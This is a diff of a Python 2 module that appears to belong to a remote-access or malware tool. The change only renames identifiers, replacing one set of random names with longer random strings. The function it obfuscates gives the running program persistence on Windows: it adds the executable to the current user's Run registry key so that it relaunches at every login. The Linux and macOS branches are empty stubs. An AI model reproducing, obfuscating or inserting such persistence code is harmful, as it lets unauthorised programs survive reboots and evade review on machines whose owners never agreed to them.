@@ -1,32 +1,32 @@
 # -*- coding: utf-8 -*-
 import sys
-def SOidCDdAkBnqeKNsrAaXuBJDCWqszXFV():
+def yRDKqoztiFHrihWVBNccofSMokVRyhkvrViPtsfYJrrijsurezzsELLmtasrizTNZHNRWZmfQOutXLkFoHqFnMvhSXHpmRnFjgHNPpsxVMyhErZDZsSUqiBGysAxqvgK():
     import _winreg
     from _winreg import HKEY_CURRENT_USER as HKCU
-    tamombRaQQHEVKoGDVlmGhIzmXVQQuaU = r'Software\Microsoft\Windows\CurrentVersion\Run'
-    ddVUCYCGOqywgAUQtrUrApZnPnVDJGhT = sys.executable
+    xfFOGdbaVPuXGpZAvVRzJeJUXtebMZMuGQpZOgoxuSRmAKgQsYRoTBBIVOYrUoobRNADLqznTgfByqEmBbiqinhUPejioTeOVZUYKwYnPBrAFOBqmatBUGjeTWOxNHNz = r'Software\Microsoft\Windows\CurrentVersion\Run'
+    wUyXWJLpmUJoPvsqYrDRopoWphJvgIWdXjcukfWHAejllZkaTPjmWHPbzIoHghpbLdBqWIkGEyUgGvJQdJEuddRhjFBzSHWXNlOwzDaKSmAIFnUjINzllTmHBbYqmiId = sys.executable
     try:
-        hqeuKANZnmHbrztRJAMjbAeZLKylIpLd = _winreg.OpenKey(HKCU, tamombRaQQHEVKoGDVlmGhIzmXVQQuaU, 0, _winreg.KEY_WRITE)
-        _winreg.SetValueEx(hqeuKANZnmHbrztRJAMjbAeZLKylIpLd, 'br', 0, _winreg.REG_SZ, ddVUCYCGOqywgAUQtrUrApZnPnVDJGhT)
-        _winreg.CloseKey(hqeuKANZnmHbrztRJAMjbAeZLKylIpLd)
+        RUEEnTzLMNemrhZYbmXztlnlraJsDwqfgqRmgFXsOSKpTQiIjDkfSQKaiWQGbTxPvlDtmNbqRQwqyBYauWPCshsBJMfeZvMDMHZExgaFIzHCCbdYuScVoywpDwzuzZHU = _winreg.OpenKey(HKCU, xfFOGdbaVPuXGpZAvVRzJeJUXtebMZMuGQpZOgoxuSRmAKgQsYRoTBBIVOYrUoobRNADLqznTgfByqEmBbiqinhUPejioTeOVZUYKwYnPBrAFOBqmatBUGjeTWOxNHNz, 0, _winreg.KEY_WRITE)
+        _winreg.SetValueEx(RUEEnTzLMNemrhZYbmXztlnlraJsDwqfgqRmgFXsOSKpTQiIjDkfSQKaiWQGbTxPvlDtmNbqRQwqyBYauWPCshsBJMfeZvMDMHZExgaFIzHCCbdYuScVoywpDwzuzZHU, 'br', 0, _winreg.REG_SZ, wUyXWJLpmUJoPvsqYrDRopoWphJvgIWdXjcukfWHAejllZkaTPjmWHPbzIoHghpbLdBqWIkGEyUgGvJQdJEuddRhjFBzSHWXNlOwzDaKSmAIFnUjINzllTmHBbYqmiId)
+        _winreg.CloseKey(RUEEnTzLMNemrhZYbmXztlnlraJsDwqfgqRmgFXsOSKpTQiIjDkfSQKaiWQGbTxPvlDtmNbqRQwqyBYauWPCshsBJMfeZvMDMHZExgaFIzHCCbdYuScVoywpDwzuzZHU)
         return True, 'HKCU Run registry key applied'
     except WindowsError:
         return False, 'HKCU Run registry key failed'
-def xEPmHtCrwicdXYthWPwLTotFiWLBDhxe():
+def dFjPEjxuZTPBMWgapLkBOfOgORkngUyycwSsvJpcifzScnBFrYvsBgAizDujZwrwjODIScAAeFCWUdEKxzxntWweSKybSLDFtKuawiRwLBIHfvxGrcZLRdJnjOJHBMdP():
     return False, 'nothing here yet'
-def BvnGwoqQMFcjcOpWMvywmzToswNUvKuH():
+def rWdvULhycESTKRUuVsrljRpxjpqAuIzOaZIWyzkJLdDieZKigmhbPoejaMkZBrVpWtUIJTbXZFvrIoAQYyMNGPzjBCPfgSYnheFROswhLtRYMJIxuDegFHMONcfBFqcp():
     return False, 'nothing here yet'
-def fRTWRMDwKMKaMMycbCQhFAtbEWeTzpNy(plat_type):
+def EkeiFedtWlBqAjUvueoDJzDYhzlrjVaurQTYvjcRGKFajKqWudkIgETSoXdxogjGpohiBhkHoNMiXnUKUBLjMagBbVUPDWzUMbcvBWIzRWTvGGOZpEVZZSZtsHFlGcBK(plat_type):
     if plat_type.startswith('win'):
-        success, WrMqFkloXIpjfperaHGHwZjJFApdGgGy = SOidCDdAkBnqeKNsrAaXuBJDCWqszXFV()
+        success, vlXtSaNoAheufrQKArmOBNLACPzJndGTAlVkckuvMIxkIHaoqoUXFmaDZLImqlXCoblsmkgRcjiddAQJyrexcirQHFSLBApfWqzoUhUAFKUafEtUMvhSVmuGSxIrUCPC = yRDKqoztiFHrihWVBNccofSMokVRyhkvrViPtsfYJrrijsurezzsELLmtasrizTNZHNRWZmfQOutXLkFoHqFnMvhSXHpmRnFjgHNPpsxVMyhErZDZsSUqiBGysAxqvgK()
     elif plat_type.startswith('linux'):
-        success, WrMqFkloXIpjfperaHGHwZjJFApdGgGy = xEPmHtCrwicdXYthWPwLTotFiWLBDhxe()
+        success, vlXtSaNoAheufrQKArmOBNLACPzJndGTAlVkckuvMIxkIHaoqoUXFmaDZLImqlXCoblsmkgRcjiddAQJyrexcirQHFSLBApfWqzoUhUAFKUafEtUMvhSVmuGSxIrUCPC = dFjPEjxuZTPBMWgapLkBOfOgORkngUyycwSsvJpcifzScnBFrYvsBgAizDujZwrwjODIScAAeFCWUdEKxzxntWweSKybSLDFtKuawiRwLBIHfvxGrcZLRdJnjOJHBMdP()
     elif plat_type.startswith('darwin'):
-        success, WrMqFkloXIpjfperaHGHwZjJFApdGgGy = BvnGwoqQMFcjcOpWMvywmzToswNUvKuH()
+        success, vlXtSaNoAheufrQKArmOBNLACPzJndGTAlVkckuvMIxkIHaoqoUXFmaDZLImqlXCoblsmkgRcjiddAQJyrexcirQHFSLBApfWqzoUhUAFKUafEtUMvhSVmuGSxIrUCPC = rWdvULhycESTKRUuVsrljRpxjpqAuIzOaZIWyzkJLdDieZKigmhbPoejaMkZBrVpWtUIJTbXZFvrIoAQYyMNGPzjBCPfgSYnheFROswhLtRYMJIxuDegFHMONcfBFqcp()
     else:
         return 'Error, platform unsupported.'
     if success:
-        IFjinVDxdJGBGwINSiNsoRzXgBpGeYOD = 'Persistence successful, {}.'.format(WrMqFkloXIpjfperaHGHwZjJFApdGgGy)
+        rgMnOQJtSRXSYxvQAklKlPKSJyWfYoBOruijshyNmfLFqRkFRdFIAwJnBkrTQzKXOBzbDszRZOMtPAmTTBxrVtzmSadGPHOUpAcpzjBJNUiDvyHcXwNBcKcGnqEpYhbM = 'Persistence successful, {}.'.format(vlXtSaNoAheufrQKArmOBNLACPzJndGTAlVkckuvMIxkIHaoqoUXFmaDZLImqlXCoblsmkgRcjiddAQJyrexcirQHFSLBApfWqzoUhUAFKUafEtUMvhSVmuGSxIrUCPC)
     else:
-        IFjinVDxdJGBGwINSiNsoRzXgBpGeYOD = 'Persistence unsuccessful, {}.'.format(WrMqFkloXIpjfperaHGHwZjJFApdGgGy)
-    return IFjinVDxdJGBGwINSiNsoRzXgBpGeYOD
+        rgMnOQJtSRXSYxvQAklKlPKSJyWfYoBOruijshyNmfLFqRkFRdFIAwJnBkrTQzKXOBzbDszRZOMtPAmTTBxrVtzmSadGPHOUpAcpzjBJNUiDvyHcXwNBcKcGnqEpYhbM = 'Persistence unsuccessful, {}.'.format(vlXtSaNoAheufrQKArmOBNLACPzJndGTAlVkckuvMIxkIHaoqoUXFmaDZLImqlXCoblsmkgRcjiddAQJyrexcirQHFSLBApfWqzoUhUAFKUafEtUMvhSVmuGSxIrUCPC)
+    return rgMnOQJtSRXSYxvQAklKlPKSJyWfYoBOruijshyNmfLFqRkFRdFIAwJnBkrTQzKXOBzbDszRZOMtPAmTTBxrVtzmSadGPHOUpAcpzjBJNUiDvyHcXwNBcKcGnqEpYhbM
